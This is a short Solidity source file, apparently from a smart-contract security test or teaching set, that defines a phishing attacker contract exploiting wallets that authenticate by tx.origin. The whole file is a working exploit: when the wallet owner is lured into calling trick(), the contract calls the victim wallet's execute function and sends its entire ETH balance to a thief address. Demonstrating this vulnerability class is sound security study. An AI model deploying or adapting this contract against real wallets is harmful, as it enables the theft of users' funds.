// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice Minimal phishing contract that tricks the owner into calling it.
/// When the owner calls `trick()`, tx.origin == owner but msg.sender == this contract.
/// If the victim wallet uses tx.origin for auth, this contract can drain it.
interface ITxOriginWallet {
    function execute(address target, uint256 value, bytes calldata data) external returns (bytes memory);
}

contract V1_PhishingAttacker {
    ITxOriginWallet public immutable VICTIM;
    address public immutable THIEF;

    constructor(address victim_, address thief_) {
        VICTIM = ITxOriginWallet(victim_);
        THIEF = thief_;
    }

    function trick() external {
        // Drain victim's ETH to thief
        VICTIM.execute(THIEF, address(VICTIM).balance, "");
    }

    receive() external payable {}
}
